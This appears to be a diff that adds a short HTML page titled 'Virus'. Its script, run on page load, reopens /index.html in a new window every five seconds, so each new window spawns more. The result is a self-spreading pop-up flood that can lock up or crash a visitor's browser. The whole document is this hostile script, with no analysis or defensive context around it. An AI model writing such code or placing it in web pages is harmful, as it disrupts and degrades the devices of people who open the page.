@@ -1,0 +1,12 @@
+<body>
+ <h1>Virus</h1>
+ <script>
+ window.onload = function(){
+  if(document.location.pathname === '/index.html') {
+  setInterval(function(){
+window.open('/index.html');
+  }, 5000);
+  }
+ }
+ </script>
+</body>
